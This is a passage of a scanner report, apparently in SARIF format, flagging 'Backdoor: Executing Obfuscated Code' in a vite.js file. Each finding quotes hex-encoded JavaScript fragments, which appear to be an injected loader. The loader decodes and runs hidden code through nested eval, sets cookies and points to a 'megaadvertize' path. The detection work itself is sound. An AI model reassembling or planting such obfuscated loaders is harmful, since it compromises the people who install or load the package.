                      "markdown": "`\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 4391,
                  "endLine": 4,
                  "endColumn": 4819,
                  "snippet": {
                    "text": "\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34",
                    "rendered": {
                      "text": "\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34",
                      "markdown": "`\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 3959,
                  "endLine": 4,
                  "endColumn": 4387,
                  "snippet": {
                    "text": "\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", \"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65",
                    "rendered": {
                      "text": "\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", \"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65",
                      "markdown": "`\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", \"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 3527,
                  "endLine": 4,
                  "endColumn": 3955,
                  "snippet": {
                    "text": "\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", \"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37",
                    "rendered": {
                      "text": "\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", \"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37",
                      "markdown": "`\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", \"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 3095,
                  "endLine": 4,
                  "endColumn": 3523,
                  "snippet": {
                    "text": "\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32",
                    "rendered": {
                      "text": "\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32",
                      "markdown": "`\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
